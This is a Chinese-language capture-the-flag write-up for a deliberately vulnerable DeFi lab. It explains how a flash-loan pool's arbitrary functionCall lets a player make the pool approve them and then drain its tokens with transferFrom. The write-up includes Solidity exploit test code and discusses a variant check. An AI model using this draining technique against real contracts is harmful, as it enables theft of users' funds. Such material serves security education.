# Solution

## 问题

整个代码非常简单，就是分析`flashLoan()`函数的漏洞，但是整个函数看上去无懈可击，因为它即使用了`nonReentrant`的修饰避免了重入的威胁，同时又在前后检查账户的余额是否有所增长。

```solidity
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}

```

但是这个案例不同于以往的漏洞，这个`flashLoan()`的既然可以functionCall任何函数，也就是说他也可以call ERC20 token中的`approve()`来准许我们后续盗走所有资金。



> [!NOTE]
>
> 值得注意的是在naive Receiver的案例中它写的方法是直接call receiver的`onFlashLoan()`函数，你可能一眼觉得其实这也是一种危险的举措，因为receiver可以偷偷在`onFlashLoan`中加入approve来把所有钱盗走。
>
> 但是事实上，如果在`onFlashLoan()`中加入approve，则会加入 `token.approve(address(this),token.balanceOf(msg.sender))`
>
> 这样会以你自己的地址来发送给token地址说我要转移token，这样``tx.origin` 是受害者的地址，而`msg.sender`就不是flashLoan受害者合约了

```diff
+        token.transfer(borrower, amount);
+        target.functionCall(data);

        naiveReceiver代码：
-       weth.transfer(address(receiver), amount);
-       receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data)
```

```solidity
  function malicisouFunc() external {
        token.approve(address(this),token.balanceOf(msg.sender));
        //上面的函数无法给这个合约额度，最后的msg.sender是合约地址而不是受害者地址。
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
    }
```



在案例的test中，只需要将`target`设定位token地址，直接`functionCall` `approve()`就好。

```solidity
    function test_truster() public checkSolvedByPlayer {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);

        pool.flashLoan(0, player, address(token), data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
        
    }
```

但是，这会有两次的transaction，不符合题意。那怎么办？

简单直接把上面的操作写入一个`Attacker`合约的函数里，player调用`Attacker`合约，一笔完成。



## 思考

如果上面最后检查条件改成小于等于，是否还能这样操作呢？

```diff
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

-        if (token.balanceOf(address(this)) < balanceBefore) {
-           revert RepayFailed();
-       }

+		if (token.balanceOf(address(this)) <= balanceBefore) {
+			revert RepayFailed();
+		}

        return true;
    }
}
```

如果是小于等于，那么就意味着我需要先用`functionCall()` -->`token::approve()`，再调用`token::transferFrom()`转一点我的钱走，但是这是两次call，而我们`token`中如果没有写好的`multiCall()`的话，我们没办法像native Receiver一样一次`functionCall()`调用两个函数.











